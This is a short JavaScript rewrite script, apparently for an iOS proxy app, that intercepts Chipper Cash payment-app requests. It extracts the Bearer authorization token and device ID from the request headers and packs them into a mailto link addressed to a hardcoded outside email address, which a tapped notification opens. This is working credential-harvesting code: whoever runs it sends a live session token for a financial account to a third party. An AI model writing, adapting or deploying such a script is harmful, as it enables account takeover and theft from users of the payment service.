let req = $request;
if (req && req.headers) {
    // 提取请求头中的 authorization，并只获取 Bearer 之后的内容
    let authorizationFull = req.headers['Authorization'] || req.headers['authorization'];
    let authorization = authorizationFull ? authorizationFull.split(" ")[1] : ""; // 假设总是存在 Bearer
    let deviceId = req.headers['chipper-device-id'] || req.headers['Chipper-Device-Id'];

    // 构造邮件正文内容
    let mailBody = `Authorization (Bearer): ${authorization}\nChipper-Device-Id: ${deviceId}`;

    // 对邮件正文进行编码
    let encodedMailBody = encodeURIComponent(mailBody);

    // 构造 mailto: 链接，确保邮件主体被正确编码
    let mailtoUrl = `mailto:niuniujun@argun.cc?subject=Chipper Cash&body=${encodedMailBody}`;

    // 发送通知
    $notification.post("Chipper Cash", "点击查看详情", "📧 发送到邮箱", { "open-url": mailtoUrl });

    $done({});
} else {
    $done({});
}
